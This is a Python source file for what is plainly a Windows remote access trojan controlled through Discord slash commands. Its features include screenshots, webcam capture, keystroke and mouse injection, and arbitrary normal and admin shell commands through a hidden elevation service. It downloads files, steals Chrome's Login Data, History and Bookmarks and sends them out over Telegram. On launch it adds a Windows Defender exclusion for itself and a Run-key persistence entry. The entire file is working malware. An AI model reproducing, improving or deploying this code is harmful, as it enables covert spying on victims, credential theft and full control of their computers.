from ctypes import windll, Structure, c_ulong, byref
from aiogram.types import FSInputFile
from typing import Dict, Optional
from urllib.parse import urlparse
from discord import app_commands
from datetime import datetime
from threading import Thread
from _ctypes import sizeof
from pathlib import Path
from aiogram import Bot
from PIL import Image
import win32process
import subprocess
import pyautogui
import keyboard
import win32gui
import win32api
import win32con
import requests
import asyncio
import discord
import ctypes
import socket
import glob
import json
import sys
import cv2
import io
import os
import re

# Config/Variables
BOT_TOKEN = "discord bot token"
AUTHORIZED_USER_IDS = [123456789]
TG_BOT_TOKEN = "discord bot token"
TG_USER_ID = 123456789
ELEVATION_CONFIG_PATH = Path(os.getenv('ProgramData')) / 'osslik.json'
ELEVATION_SERVICE_PORT = 58473
ACTIVE_PROCESSES: Dict[str, subprocess.Popen] = {}
WORKING_FILE = __file__


class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_ulong),
        ('dwTime', c_ulong),
    ]


# Bot Setup
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)


# Function: Setup Elevation Service
def setup_elevation_service():
    def create_elevation_service():
        """Create elevation service config if it doesn't exist"""
        if not ELEVATION_CONFIG_PATH.exists():
            config = {
                "port": ELEVATION_SERVICE_PORT,
                "auth_token": os.urandom(32).hex()
            }
            with open(ELEVATION_CONFIG_PATH, 'w') as f:
                json.dump(config, f)

    if ctypes.windll.shell32.IsUserAnAdmin():
        create_elevation_service()
    else:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f'"{__file__}"', None, 1
        )


# Function: Start Elevation Service
def start_elevation_service():
    """Start the elevation service in a separate thread"""

    def run_service():
        try:
            # Read config
            with open(ELEVATION_CONFIG_PATH) as f:
                config = json.load(f)

            # Create socket server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('localhost', config['port']))
                s.listen()
                print(f"🔼 Elevation service running on port {config['port']}")

                while True:
                    conn, addr = s.accept()
                    try:
                        data = conn.recv(4096).decode()
                        request = json.loads(data)

                        if request.get('token') != config['auth_token']:
                            conn.send(b'{"status": "invalid_token"}')
                            continue

                        # Execute command with admin privileges
                        result = subprocess.run(
                            request['command'],
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=request.get('timeout', 30)
                        )

                        response = {
                            "status": "success",
                            "stdout": result.stdout,
                            "stderr": result.stderr,
                            "returncode": result.returncode
                        }
                        conn.send(json.dumps(response).encode())

                    except Exception as e:
                        conn.send(json.dumps({"status": str(e)}).encode())
                    finally:
                        conn.close()

        except Exception as e:
            print(f"❌ Elevation service failed: {e}")

    # Start in daemon thread (auto-kills when main thread exits)
    Thread(target=run_service, daemon=True).start()


# Function: Check User Access
def is_authorized(user_id):
    return user_id in AUTHORIZED_USER_IDS


# Function: Caputure Cameras
async def capture_all_cameras(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        await interaction.response.defer()

        # Security notification
        notification = f"🔔 Camera access triggered by {interaction.user.name} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        # Try up to 3 cameras (adjust range if needed)
        camera_images = []
        for camera_id in range(3):
            try:
                cap = cv2.VideoCapture(camera_id)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret:
                        # Convert to RGB (OpenCV uses BGR)
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                        camera_images.append((camera_id, frame))
                    cap.release()
            except Exception as e:
                print(f"Error accessing camera {camera_id}: {e}")

        if not camera_images:
            await interaction.followup.send("❌ No cameras detected")
            return

        # Prepare and send images
        files = []
        for cam_id, image in camera_images:
            img_pil = Image.fromarray(image)
            with io.BytesIO() as output:
                img_pil.save(output, format="JPEG", quality=85)
                output.seek(0)
                files.append(discord.File(output, filename=f"camera_{cam_id}.jpg"))

        await interaction.followup.send(
            content=f"{notification}\n📷 Detected {len(camera_images)} camera(s)",
            files=files
        )

    except Exception as e:
        await interaction.followup.send(f"❌ Camera error: {str(e)}")
        print(f"Camera capture failed: {e}")


# Function: Execute Command (Elevated)
async def execute_elevated(command: str, timeout: int = 30) -> Optional[dict]:
    """Execute a command through the elevation service"""
    try:
        if not ELEVATION_CONFIG_PATH.exists():
            return None

        with open(ELEVATION_CONFIG_PATH) as f:
            config = json.load(f)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout + 5)
            s.connect(('localhost', config['port']))
            s.send(json.dumps({
                "token": config['auth_token'],
                "command": command,
                "timeout": timeout
            }).encode())

            response = s.recv(65536).decode()
            return json.loads(response)

    except Exception as e:
        print(f"Elevation service error: {e}")
        return None


# Function: Send File On Telegram
async def send_file_once(FILE_PATH):
    bot = Bot(token=TG_BOT_TOKEN)
    try:
        file = FSInputFile(FILE_PATH)
        await bot.send_document(chat_id=TG_USER_ID, document=file, caption=FILE_PATH)
        print("✅ File sent successfully.")
    except Exception as e:
        print(f"❌ Failed to send file: {e}")
    finally:
        await bot.session.close()


# Bot Events
@client.event
async def on_ready():
    await tree.sync()
    print(f'Logged in as {client.user}')


# Command: Screenshot
@tree.command(name="screenshot", description="Take and send a screenshot")
async def take_screenshot(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        # Let user know we're processing
        await interaction.response.defer()

        # Take screenshot
        screenshot = pyautogui.screenshot()

        # Convert to bytes
        with io.BytesIO() as output:
            screenshot.save(output, format="PNG")
            output.seek(0)

            # Send the image
            file = discord.File(output, filename="screenshot.png")
            await interaction.followup.send(file=file)

    except Exception as e:
        await interaction.followup.send(f"❌ Failed to take screenshot: {str(e)}")


# Command: Hotkey
@tree.command(name="hotkey", description="Press a hotkey combination")
@app_commands.describe(keys="The key combination to press (e.g., ctrl+alt+delete)")
async def hotkey(interaction: discord.Interaction, keys: str):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        keyboard.press_and_release(keys)
        await interaction.response.send_message(f"✅ Pressed hotkey: `{keys}`")
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}")


# Command: Key Press
@tree.command(name="key", description="Press a single key")
@app_commands.describe(key="The key to press (e.g., a, enter, space)")
async def press_key(interaction: discord.Interaction, key: str):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        keyboard.press_and_release(key)
        await interaction.response.send_message(f"✅ Pressed key: `{key}`")
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}")


# Command: Type Text
@tree.command(name="type", description="Type out text")
@app_commands.describe(text="The text to type")
async def type_text(interaction: discord.Interaction, text: str):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        keyboard.write(text)
        await interaction.response.send_message(f"✅ Typed: `{text}`")
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}")


# Command: Move Cursor
@tree.command(name="move", description="Move mouse cursor to position")
@app_commands.describe(x="X coordinate", y="Y coordinate")
async def move_cursor(interaction: discord.Interaction, x: int, y: int):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        pyautogui.moveTo(x, y)
        await interaction.response.send_message(f"✅ Moved cursor to ({x}, {y})")
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}")


# Command: Click Mouse
@tree.command(name="click", description="Click mouse button")
@app_commands.describe(button="Which button to click (left, right, middle)")
async def click_mouse(interaction: discord.Interaction, button: str):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        button = button.lower()
        if button == "left":
            pyautogui.click()
        elif button == "right":
            pyautogui.rightClick()
        elif button == "middle":
            pyautogui.middleClick()
        else:
            await interaction.response.send_message("❌ Invalid button. Use left, right, or middle.")
            return

        await interaction.response.send_message(f"✅ Clicked {button} button")
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}")


# Command: Scroll
@tree.command(name="scroll", description="Scroll mouse wheel")
@app_commands.describe(amount="Scroll amount (positive=up, negative=down)")
async def scroll_wheel(interaction: discord.Interaction, amount: int):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        pyautogui.scroll(amount)
        direction = "up" if amount > 0 else "down"
        await interaction.response.send_message(f"✅ Scrolled {direction} {abs(amount)} units")
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}")


# Command: Check Cameras
@tree.command(name="checkcams", description="Check all connected cameras")
async def check_cams(interaction: discord.Interaction):
    await capture_all_cameras(interaction)


# Command: Last Active
@tree.command(name="lastactive", description="Check last keyboard/mouse activity time")
async def last_active(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        # Windows-specific input detection
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = sizeof(lastInputInfo)
        windll.user32.GetLastInputInfo(byref(lastInputInfo))

        millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
        seconds = millis // 1000
        minutes, seconds = divmod(seconds, 60)
        hours, minutes = divmod(minutes, 60)

        if millis < 1000:
            response = "🔄 Active right now!"
        else:
            response = f"⏱️ Last activity: {hours}h {minutes}m {seconds}s ago"

        await interaction.response.send_message(response)

    except Exception as e:
        await interaction.response.send_message(f"❌ Error checking activity: {str(e)}")


# Command: Execute Command
@tree.command(name="runcmd", description="Execute a regular command (non-admin)")
@app_commands.describe(
    command="The command to execute",
    shell_type="Type of shell to use",
    timeout="Timeout in seconds (default: 30)"
)
@app_commands.choices(shell_type=[
    app_commands.Choice(name="CMD", value="cmd"),
    app_commands.Choice(name="PowerShell", value="ps")
])
async def run_command(
        interaction: discord.Interaction,
        command: str,
        shell_type: str,
        timeout: Optional[int] = 30
):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        await interaction.response.defer()

        # Prepare shell command
        if shell_type == "cmd":
            shell_cmd = ["cmd", "/c", command]
        else:  # PowerShell
            shell_cmd = ["powershell", "-Command", command]

        # Execute command
        result = subprocess.run(
            shell_cmd,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=timeout
        )

        # Prepare output
        output = result.stdout if result.stdout else "(No output)"
        error = result.stderr if result.stderr else "(No errors)"

        # Send response
        response = (
            f"✅ Command executed in {shell_type}\n"
            f"📝 Output:\n```\n{output[:1500]}```\n"
            f"⚠️ Errors:\n```\n{error[:1500]}```"
        )

        await interaction.followup.send(response)

    except subprocess.TimeoutExpired:
        await interaction.followup.send(f"❌ Command timed out after {timeout} seconds")
    except Exception as e:
        await interaction.followup.send(f"❌ Error executing command: {str(e)}")


# Command: Execute Command (Elevated)
@tree.command(name="admincmd", description="Execute command with admin privileges")
@app_commands.describe(
    command="The command to execute",
    shell_type="Shell type to use",
    timeout="Timeout in seconds (default: 30)"
)
@app_commands.choices(shell_type=[
    app_commands.Choice(name="Admin CMD", value="cmd_admin"),
    app_commands.Choice(name="Admin PowerShell", value="ps_admin")
])
async def admin_command(
        interaction: discord.Interaction,
        command: str,
        shell_type: str,
        timeout: Optional[int] = 30
):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        await interaction.response.defer()

        # Prepare full command
        full_cmd = f"cmd /c {command}" if shell_type == "cmd_admin" else f"powershell -Command {command}"

        # Execute through elevation service
        result = await execute_elevated(full_cmd, timeout)

        if not result:
            await interaction.followup.send(
                "❌ Elevation service not available\n"
                "Please run the elevation setup first:\n"
                "1. Right-click `elevator_setup.py`\n"
                "2. Select 'Run as administrator'\n"
                "3. Restart your bot"
            )
            return

        if result.get('status') != "success":
            await interaction.followup.send(f"❌ Admin command failed: {result.get('status', 'Unknown error')}")
            return

        # Prepare output
        output = result.get('stdout', '(No output)')
        error = result.get('stderr', '(No errors)')

        # Send response
        response = (
            f"🛡️ Admin command completed (code: {result.get('returncode', '?')})\n"
            f"📋 Command: `{command}`\n\n"
            f"📝 Output:\n```\n{output[:1500]}```\n"
            f"⚠️ Errors:\n```\n{error[:1500]}```"
        )

        await interaction.followup.send(response)

    except Exception as e:
        await interaction.followup.send(f"❌ Error executing admin command: {str(e)}")


# Command: List Windows
@tree.command(name="listwindows", description="List all visible application windows")
async def list_windows(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        await interaction.response.defer()

        windows = []

        def enum_windows_callback(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:  # Only list windows with titles
                    # Get process ID
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)

                    # Get process name using Win32 API
                    try:
                        h_process = win32api.OpenProcess(
                            win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ,
                            False,
                            pid
                        )
                        exe_path = win32process.GetModuleFileNameEx(h_process, 0)
                        process_name = os.path.basename(exe_path)
                        win32api.CloseHandle(h_process)
                    except:
                        process_name = "Unknown"

                    windows.append(f"• {title} ({process_name})")

        # Enumerate all windows
        win32gui.EnumWindows(enum_windows_callback, None)

        # Format the output
        if not windows:
            await interaction.followup.send("No visible windows found")
            return

        # Split into chunks to avoid Discord message limit
        chunk_size = 15
        for i in range(0, len(windows), chunk_size):
            chunk = windows[i:i + chunk_size]
            response = "📋 Open Windows:\n```\n" + "\n".join(chunk) + "\n```"
            if i + chunk_size < len(windows):
                response += f"\n... and {len(windows) - (i + chunk_size)} more"

            await interaction.followup.send(response)

    except Exception as e:
        await interaction.followup.send(f"❌ Error listing windows: {str(e)}")


# Command: Send File
@tree.command(name="sendfile", description="Send a file to your PC")
@app_commands.describe(
    source="File URL",
    destination="Where to save the file (default: Downloads)"
)
async def send_file(
        interaction: discord.Interaction,
        source: str,
        destination: Optional[str] = None
):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        await interaction.response.defer()

        # Set default download directory
        download_dir = Path.home() / "Downloads"
        if destination:
            dest_path = Path(destination)
            if not dest_path.is_absolute():
                dest_path = download_dir / dest_path
        else:
            dest_path = download_dir

        # Ensure directory exists
        dest_path.parent.mkdir(parents=True, exist_ok=True)

        # Handle URL download
        if source.startswith(('http://', 'https://')):
            try:
                response = requests.get(source, stream=True, timeout=30)
                response.raise_for_status()

                # Get filename from URL or headers
                filename = os.path.basename(urlparse(source).path)
                if not filename:
                    if 'content-disposition' in response.headers:
                        filename = re.findall('filename=(.+)', response.headers['content-disposition'])[0]
                    else:
                        filename = "downloaded_file"

                file_path = dest_path / filename

                # Save file
                with open(file_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)

                await interaction.followup.send(f"✅ Downloaded: `{file_path}`")

            except Exception as e:
                await interaction.followup.send(f"❌ URL download failed: {str(e)}")
        else:
            await interaction.followup.send("❌ Please provide either a URL or file attachment")

    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")


# Command: Send File
@tree.command(name="chromedata", description="Retrieve Chrome data files")
async def get_chrome_data(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("❌ Unauthorized.", ephemeral=True)
        return

    try:
        await interaction.response.defer()

        username = os.getenv('USERNAME')
        chrome_path = Path(f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default")

        if not chrome_path.exists():
            await interaction.followup.send("❌ Directory not found")
            return

        # Prepare files to send
        files_to_send = []
        target_files = ["Bookmarks", "Login Data", "History"]
        counter = 0

        for filename in target_files:
            file_path = chrome_path / filename
            if file_path.exists():
                try:
                    # Read binary data from source file
                    with open(file_path, 'rb') as src_file:
                        file_data = src_file.read()

                    # Create temp file with .sqlite3 extension
                    temp_filename = f"log{counter}.sqlite3"
                    counter += 1
                    with open(temp_filename, 'wb') as temp_file:
                        temp_file.write(file_data)

                    files_to_send.append(temp_filename)
                except Exception as e:
                    await interaction.followup.send(f"⚠️ Error reading {filename}: {str(e)}")
            else:
                await interaction.followup.send(f"⚠️ File not found: {filename}")

        if not files_to_send:
            await interaction.followup.send("❌ No requested files found")
            return

        # Send files
        for filepath in files_to_send:
            await send_file_once(filepath)

            try:
                os.remove(filepath)
            except:
                pass

        await interaction.followup.send("✅ Retrieved Chrome data")



    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")
        # Cleanup any partial files
        for filepath in files_to_send:
            if os.path.exists(filepath):
                try:
                    os.remove(filepath)
                except:
                    pass

# Setup elevation
if not ELEVATION_CONFIG_PATH.exists():
    setup_elevation_service()

print(WORKING_FILE)

# Start elevation thread
elevation_thread = Thread(target=start_elevation_service, )
elevation_thread.daemon = True
elevation_thread.start()

# Add Defender exclusion
asyncio.run(execute_elevated(f"powershell -Command \"Add-MpPreference -ExclusionPath \'{WORKING_FILE}\'\""))
asyncio.run(execute_elevated(f"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MyProgram\" /t REG_SZ /d \"{WORKING_FILE}\" /f"))

client.run(BOT_TOKEN)
